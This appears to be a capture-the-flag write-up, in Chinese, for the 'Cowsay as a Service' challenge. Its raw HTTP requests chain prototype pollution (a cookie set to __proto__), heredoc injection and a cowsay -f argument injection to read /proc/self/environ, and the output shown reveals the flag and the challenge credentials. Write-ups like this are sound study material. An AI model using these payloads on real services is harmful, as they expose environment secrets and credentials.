# Cowsay as a Service

有很明顯的 Prototype Pollution

由於flag在環境變數，然後他跑的command是`cowsay`

所以我就找了一條不用RCE的讀環境變數方法

```
POST /setting/shell
Host: cowsay-nodes.chal.acsc.asia:64487
Authorization: Basic Q0hYbmVoaW1LdEFnd29zZDpkTFp2Z2VSdU5wU09mSnhI
Upgrade-Insecure-Requests: 1
Origin: http://cowsay-nodes.chal.acsc.asia:62890
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4274.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://cowsay-nodes.chal.acsc.asia:62890/cowsay
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: username=__proto__
Connection: close
Content-Length: 21

{"value":"/bin/bash"}
```

```
POST /setting/$the_cow=<<EOC;%0a HTTP/1.1
Host: cowsay-nodes.chal.acsc.asia:64487
Authorization: Basic Q0hYbmVoaW1LdEFnd29zZDpkTFp2Z2VSdU5wU09mSnhI
Upgrade-Insecure-Requests: 1
Origin: http://cowsay-nodes.chal.acsc.asia:62890
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4274.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://cowsay-nodes.chal.acsc.asia:62890/cowsay
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: username=__proto__
Connection: close
Content-Length: 21

{"value":"<<<EOC;\n"}
```


```
POST /setting/execPath HTTP/1.1
Host: cowsay-nodes.chal.acsc.asia:64487
Authorization: Basic Q0hYbmVoaW1LdEFnd29zZDpkTFp2Z2VSdU5wU09mSnhI
Upgrade-Insecure-Requests: 1
Origin: http://cowsay-nodes.chal.acsc.asia:62890
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4274.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://cowsay-nodes.chal.acsc.asia:62890/cowsay
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: username=__proto__
Connection: close
Content-Length: 20

{"value":"\nEOC\n#"}
```

最後argument injection，透過`cowsay -f`讀environ

```
GET /cowsay?say=-f+/proc/self/environ HTTP/1.1
Host: cowsay-nodes.chal.acsc.asia:64487
Authorization: Basic Q0hYbmVoaW1LdEFnd29zZDpkTFp2Z2VSdU5wU09mSnhI
Upgrade-Insecure-Requests: 1
Origin: http://cowsay-nodes.chal.acsc.asia:62890
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4274.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://cowsay-nodes.chal.acsc.asia:62890/cowsay
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: username=__proto__
Connection: close
Content-Length: 0


```

=>

```
<pre style="color: #000000" class="cowsay">
 __
<  >
 --
=<<<EOC;
HOSTNAME=49c581b59a0dCS_USERNAME=CHXnehimKtAgwosdshell=/bin/bashYARN_VERSION=1.22.5PWD=/usr/src/appCS_PASSWORD=dLZvgeRuNpSOfJxHHOME=/home/nodeFLAG=ACSC{(oo)<Moooooooo_B09DRWWCSX!}SHLVL=0execPath=

</pre>
```
